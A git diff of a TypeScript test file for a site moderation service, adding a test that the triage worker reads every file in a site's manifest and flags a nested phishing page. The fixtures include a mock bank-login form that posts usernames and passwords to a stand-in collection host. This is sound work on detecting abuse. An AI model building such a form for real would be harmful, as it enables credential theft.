@@ -2,9 +2,10 @@ import { afterAll, beforeAll, beforeEach, describe, expect, test } from 'bun:tes
 import { LABELER_SCHEMA_STATEMENTS, MODERATION_SCHEMA_STATEMENTS } from '@wispplace/database'
 import postgres from 'postgres'
 import { createModerationApi, subjectDid } from './api'
+import { readFile } from './site-files'
 import { createModerationStore, decodeCursor, encodeCursor, siteUri } from './store'
 import { createSiteSync, readPublished, siteUrl } from './sync'
-import { createTriageWorker, readPage } from './triage'
+import { createTriageWorker } from './triage'
 
 const LABELER = 'did:plc:labelerlabelerlabelerlab'
 const ALICE = 'did:plc:aaaaaaaaaaaaaaaaaaaaaaaa'
@@ -26,13 +27,16 @@ describe('pure helpers', () => {
 		expect(decodeCursor('nonsense')).toBeNull()
 	})
 
-	test('readPage pulls the title, outbound hosts and visible text', () => {
-		const page = readPage(
-			'<html><head><title>Hi &amp; bye</title><style>x{}</style></head><body><script>evil()</script><h1>Cheap  pills</h1><a href="https://spam.example/x">buy</a><a href="/local">l</a></body></html>',
+	test('readFile pulls the title, outbound hosts and visible text', () => {
+		const html =
+			'<html><head><title>Hi &amp; bye</title><style>x{}</style></head><body><script>evil()</script><h1>Cheap  pills</h1><a href="https://spam.example/x">buy</a><a href="/local">l</a></body></html>'
+		const page = readFile(
+			{ path: '/', status: 200, contentType: 'text/html', body: html, bytes: html.length, truncated: false },
+			'sites.wisp.place',
 			3000,
 		)
 		expect(page.title).toBe('Hi & bye')
-		expect(page.outbound).toEqual(['spam.example'])
+		expect(page.hosts).toEqual(['spam.example'])
 		expect(page.text).toBe('Cheap pills buy l')
 	})
 
@@ -178,7 +182,7 @@ suite('moderation (postgres)', () => {
 		expect((await store.site(siteUri(ALICE, 'shop')))?.labels).toEqual([])
 	})
 
-	test('a page that does not answer is retried, then cleared with the status as the reason', async () => {
+	test('a site that does not answer is retried, then cleared with the statuses as the reason', async () => {
 		await publish(BOB, 'gone', 'cid1', 1000)
 		await sync().syncAll()
 		const w = worker(true, page('', 503))
@@ -190,7 +194,55 @@ suite('moderation (postgres)', () => {
 		}
 		expect(await store.site(siteUri(BOB, 'gone'))).toMatchObject({
 			state: 'clear',
-			triage: { reason: 'the page answered 503', model: 'none' },
+			triage: { reason: 'no file answered: / 503, index.html 503', model: 'none' },
+		})
+	})
+
+	test('triage reads every manifest path, so a root 404 does not hide a nested page', async () => {
+		// file_cids as the firehose writes it after expanding subfs: `docs` came from a
+		// non-flat subfs record, `secure/` from a flat one merged into the root.
+		await publish(BOB, 'mail', 'cid1', 1000, {
+			'docs/guide.html': 'a',
+			'docs/parts/verify/login.html': 'b',
+			'secure/app.js': 'c',
+			'favicon.ico': 'd',
+		})
+		await sync().syncAll()
+		const next = await store.nextPending()
+		expect(next?.paths).toEqual(['docs/guide.html', 'docs/parts/verify/login.html', 'favicon.ico', 'secure/app.js'])
+		const base = `https://sites.wisp.place/${BOB}/mail/`
+		const fetched: string[] = []
+		const fetchImpl = (async (input: string | URL) => {
+			const path = String(input).slice(base.length)
+			fetched.push(path)
+			if (path === 'docs/parts/verify/login.html')
+				return new Response(
+					'<title>Bank login</title><form action="https://collect.example/p" method="post"><input name="user"><input type="password" name="pw"></form>',
+				)
+			if (path === 'docs/guide.html') return new Response('<p>a guide</p>')
+			return new Response('', { status: 404 })
+		}) as unknown as typeof fetch
+		let description = ''
+		await createTriageWorker({
+			store,
+			model: 'test-model',
+			fetchImpl,
+			classify: async (d) => {
+				description = d
+				return { flag: true, category: 'phishing', reason: 'bank login posting off-site', confidence: 0.9, files: [] }
+			},
+		}).drain()
+		expect(fetched.sort()).toEqual(['', 'docs/guide.html', 'docs/parts/verify/login.html', 'secure/app.js'])
+		expect(description).toContain('== docs/parts/verify/login.html')
+		expect(description).toContain('Form: post to https://collect.example/p; inputs user:text, pw:password')
+		expect(await store.site(siteUri(BOB, 'mail'))).toMatchObject({
+			state: 'flagged',
+			title: 'Bank login',
+			triage: {
+				flag: true,
+				reason: 'docs/parts/verify/login.html: bank login posting off-site',
+				files: ['docs/parts/verify/login.html'],
+			},
 		})
 	})
 
